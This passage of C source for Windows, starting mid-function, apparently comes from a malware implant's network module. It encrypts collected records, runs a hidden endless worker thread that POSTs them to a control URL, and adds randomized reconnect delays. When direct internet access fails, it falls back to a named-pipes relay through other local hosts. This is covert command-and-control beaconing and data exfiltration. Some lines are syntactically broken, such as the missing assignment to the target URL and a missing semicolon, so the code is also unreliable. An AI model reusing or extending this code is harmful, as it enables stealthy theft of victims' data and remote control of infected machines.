		// add extra NULL ptr to a list
		LPVOID pNullPtr = NULL;
		msChunkPtrs.msWriteStream(&msChunkPtrs, &pChunk, sizeof(LPVOID));

		// encrypt prepared buffer using some pre-defined key, replacing msSerializedItems contents and it's size
		cryptEncryptStream(&msSerializedItems);

		// save result to caller
		*pResultingBuffer = msSerializedItems.pData;
		*dwResultingBufferLen = msSerializedItems.lDataLen;
		*pChunksListContext = msChunkPtrs.pData;	// no need for size here, as this stream is a null-terminated ptrs list

		// set function result
		bRes = TRUE;

	} else {

		// nothing was found, dispose streams directly
		msChunkPtrs.msFreeStream(&msChunkPtrs);
		msSerializedItems.msFreeStream(&msSerializedItems);

		// assign empty results
		*pResultingBuffer = NULL;
		*dwResultingBufferLen = 0;
		*pChunksListContext = NULL;
	}

	DbgPrint("done, %u items, %u bytes", dwItemsCount, *dwResultingBufferLen)

	return bRes;
}


// enters cs and checks if transport is initialized
VOID _tsgenLockTransport(NETWORK_CONNECTIVITY_CONTEXT *ncContext)
{

	do {

		EnterCriticalSection(&ncContext->csTransportAccess);

		if (!ncContext->pTransportHandle) { LeaveCriticalSection(&ncContext->csTransportAccess); Sleep(1000); } else { break; }

	} while (TRUE);

}

VOID _tsgenUnlockTransport(NETWORK_CONNECTIVITY_CONTEXT *ncContext) { LeaveCriticalSection(&ncContext->csTransportAccess); }

/*
	Worker thread to periodically query for a list of records
	and send it to server, saving it's answer to be read by callers later
*/
DWORD WINAPI tsgenWorkerThread(LPVOID lpParameter)
{
	NETWORK_CONNECTIVITY_CONTEXT *ncContext = (NETWORK_CONNECTIVITY_CONTEXT *)lpParameter;

	LPVOID pChunksListContext = NULL;	// ptr to a buffer with ptrs of all chunks combined into pPackageBuffer, with ending NULL ptr 
	TRANSPORT_QUERY tq;	// input params to be send to transport's query function
	LPVOID pAnswer = NULL;
	DWORD dwAnswerLen = 0;
	BOOL bIterationResult = FALSE;	// set on every iteration to indicate it's status

	DbgPrint("entered");

	do { // infinite loop

		bIterationResult = FALSE;

		// wait for some records arrived and transport ready to work
		while ((!tsgenContext.dwItemsCount) || (!ncContext->pTransportHandle)) { Sleep(5000); }

		// wipe query structure
		memset(&tq, 0, sizeof(TRANSPORT_QUERY));

		// prepare a binary chunk to be uploaded via some transport at pTransportHandle
		if (!tsgenFormOutgoingPackage(ncContext->pTransportHandle->dwMaxSuggestedDataLen, &tq.pSendBuffer, &tq.lSendBufferLen, &pChunksListContext)) {
			
			//DbgPrint("no package to send"); 
			Sleep(5000); 
		
		} else {

			// this thread is the only consumer and caller of tsgenSelectTransport() after init
			// other call sources are using cs to prevent from using pTransport while it is re-initializing
			// infinite wait here until transport is ready
			//_tsgenLockTransport(ncContext);

			// update chunk's state to CS_UPLOADING
			tsgenUpdateChunksStatus(pChunksListContext, CS_UPLOADING);

			// prepare query params
			tq.tqType = QT_POST;
#ifdef _DEBUG
			tq.wszTarget DEBUG_CONTROL_URL;	// to be generated
#else
			tq.wszTarget RELEASE_CONTROL_URL;
#endif
			tq.pAnswer = &pAnswer;
			tq.dwAnswerLen = &dwAnswerLen;
			pAnswer = NULL;
			dwAnswerLen = 0;

			// have a package ready to send, query via transport's interface
			// it is up to transport to perform essential delays between network communications
			if (ncContext->pTransportHandle->fQuery(ncContext->pTransportHandle, &tq)) {

				// check results and send it to results assigner
				bIterationResult = tsgenAssignChunksResults(pChunksListContext, pAnswer, dwAnswerLen);

			} else {
				DbgPrint("transport query fail, total err counter=%u", ncContext->pTransportHandle->dwLastFailedConnectionAttempts);

				// if error count exceeds limits, do transport re-selection
				if (ncContext->pTransportHandle->dwLastFailedConnectionAttempts > 5) {

					DbgPrint("error count exceeded, re-initializing transports");
					// NB: cs lock is done internally
					tsgenSelectTransport(ncContext);

				} // err count exceeded

			} // fQuery()

			// free transport access lock
			//_tsgenUnlockTransport(ncContext);

			// free memory used
			if (tq.pSendBuffer) { my_free(tq.pSendBuffer); }
			if (pChunksListContext) { my_free(pChunksListContext); pChunksListContext = NULL; }
			if (pAnswer) { my_free(pAnswer); }

		}	// package formed

		// check for outdated chunks AND broadcast answers to subscribers (worker modules)
		_tsgenRemoveOutdatedChunks(REMOTE_CHUNK_ANSWER_TTL_MINS);

		// perform some wait in case of any iteration failure
		// note that transport may perform it's own delay too
		if (!bIterationResult) { 

			//DbgPrint("empty iteration, waiting..."); 
#ifdef _DEBUG
			Sleep(5000);	// debug 5s
#else
			Sleep(WAIT_MINUTES_IF_NETWORK_COMMUNICATION_FAILED * 60 * 1000);	// release 15m
#endif
			//DbgPrint("done empty iteration wait");

		} // !bIterationResult

	} while (TRUE);	// infinite loop
}



/*
	Called after tsgenInit() when init selected a working transport.
	This function checks and creates a worker thread which periodically checks internal list for outgoing data
	and stores server's answer for that requests
	
VOID tsgenAssignTransport(TRANSPORT_HANDLE *pTransportHandle)
{
	DWORD dwThreadId;

	// check if worker was already starter
	if (tsgenContext.hWorkerThread) { DbgPrint("ERR: worker is already running"); return; }

	// save ptr
	tsgenContext.pTransportHandle = pTransportHandle;

	// create worker thread
	tsgenContext.hWorkerThread = CreateThread(NULL, 0, tsgenWorkerThread, (LPVOID)pTransportHandle, 0, &dwThreadId);
}
*/


/*
	Should be called before any other functions used.
	Initializes internal vars and reads contents from local persistent storage,
	which possibly was stored before

	Receives a ptr from some other module, where pTransportHandle is placed / changed
*/
VOID tsgenInit(NETWORK_CONNECTIVITY_CONTEXT *ncContext)
{
	DWORD dwThreadId;

	// init globals
	memset(&tsgenContext, 0, sizeof(TSG_WORK_STRUCTURE));

	// chunk list manipulation - related
	InitializeCriticalSection(&tsgenContext.csListAccess);


	// create worker thread
	tsgenContext.hWorkerThread = CreateThread(NULL, 0, tsgenWorkerThread, (LPVOID)ncContext, 0, &dwThreadId);

	DbgPrint("init done, worker thread id = %u", dwThreadId);

}

/*
	Performs check if remote network connectivity is possible
*/
BOOL tsgenSelectTransport(NETWORK_CONNECTIVITY_CONTEXT *ncContext)
{
	RndClass rg = { 0 };
	DWORD dwWaitSec;	// wait amount of seconds
	BOOL bRes = FALSE;	// function result

	DbgPrint("entered, waiting for cs");

	EnterCriticalSection(&ncContext->csTransportAccess);

	DbgPrint("cs entered");

	// do a pre-wait according to config.h settings
	rgNew(&rg);
	dwWaitSec = rg.rgGetRnd(&rg, NETWORK_CHECK_ATTEMPT_DELAY_SEC_MIN, NETWORK_CHECK_ATTEMPT_DELAY_SEC_MAX);
	DbgPrint("selected to wait %u from range[%u..%u]", dwWaitSec, NETWORK_CHECK_ATTEMPT_DELAY_SEC_MIN, NETWORK_CHECK_ATTEMPT_DELAY_SEC_MAX);
	Sleep(dwWaitSec * 1000);

	DbgPrint("done wait, selecting transport");

	if (ncContext->pTransportHandle) {
		DbgPrint("deinitializing previous transport at %p", ncContext->pTransportHandle);

		if (ncContext->pTransportHandle->fDispose) { ncContext->pTransportHandle->fDispose(ncContext->pTransportHandle); } else { DbgPrint("WARN: no fDispose() defined"); }

		ncContext->pTransportHandle = NULL;
	}

	do {	// not a loop

		// try to init a working transport for remote communications

		// WinHTTP - HTTP(S), direct or via WPAD/registry proxy
		if (ncContext->pTransportHandle = tswhttpInitTransport()) { DbgPrint("WinHTTP transport inited ok"); bRes = TRUE; cmsReportInternetAccessStatus(TRUE); break; }

		// no connection at all - try to communicate with other hosts to find out a working machine with remote connections
		if (ncContext->pTransportHandle = tspipesInitTransport()) { DbgPrint("Pipes transport inited ok"); bRes = TRUE; cmsReportInternetAccessStatus(FALSE); break; }

	} while (FALSE);	// not a loop

	DbgPrint("finished with %u res, exiting cs", bRes);

	LeaveCriticalSection(&ncContext->csTransportAccess);

	return bRes;
}